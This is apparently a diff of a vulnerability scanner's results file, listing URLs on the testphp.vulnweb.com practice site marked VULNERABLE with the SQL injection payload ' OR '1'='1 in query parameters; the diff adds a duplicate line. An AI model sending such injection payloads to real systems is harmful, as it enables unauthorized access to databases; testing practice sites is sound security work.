@@ -1,2 +1,3 @@
 VULNERABLE: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1
 VULNERABLE: http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1
+VULNERABLE: http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1
